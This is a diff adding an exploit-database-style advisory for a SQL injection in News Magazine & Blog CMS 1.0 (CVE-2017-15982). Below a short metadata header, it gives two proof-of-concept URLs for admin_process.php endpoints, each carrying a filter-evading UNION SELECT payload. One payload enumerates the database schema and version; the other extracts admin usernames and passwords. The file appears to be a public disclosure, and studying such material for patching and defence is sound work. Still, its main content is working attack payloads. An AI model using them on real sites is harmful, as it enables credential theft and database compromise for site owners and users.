@@ -1,0 +1,31 @@
+# # # # # 
+# Exploit Title: News Magazine & Blog CMS 1.0 - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://geniusocean.com/
+# Software Link: https://codecanyon.net/item/news-dynamic-newspaper-magazine-and-blog-cms-script/19656143
+# Demo: http://demo.geniusocean.com/news/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15982
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/admin_process.php?act=vdoeditform&id=[SQL]
+# 
+# -1'++/*!50000UNION*/+/*!50000SELECT*/+0x31,(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)),VersiON(),0x34,0x35,0x36--+-
+# 
+# http://localhost/[PATH]/admin/admin_process.php?act=cateditform&id=[SQL]
+# 
+# -1'++/*!00022UNION*/+/*!00022SELECT*/+0x31,/*!00022cOnCat*/(username,0x3a,password),0x33,0x34,0x35+/*!00022From*/+admin--+-
+# 
+# Etc..
+# # # # #
